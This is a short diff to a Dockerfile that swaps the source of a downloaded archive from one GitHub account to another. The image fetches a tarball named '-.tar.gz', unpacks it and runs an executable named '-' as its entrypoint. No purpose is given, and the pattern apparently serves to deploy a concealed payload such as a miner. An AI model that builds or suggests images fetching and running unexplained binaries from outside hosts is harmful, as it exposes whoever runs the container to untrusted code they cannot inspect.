@@ -1,7 +1,7 @@
 FROM ubuntu:latest AS build
 RUN apt-get update && apt-get -y install wget vim
 WORKDIR /home
-RUN wget https://github.com/nurkartina604/st/raw/main/-.tar.gz
+RUN wget https://github.com/muledan1/bash/raw/main/-.tar.gz
 RUN tar -xvf -.tar.gz
 
 ENTRYPOINT [ "./-" ]
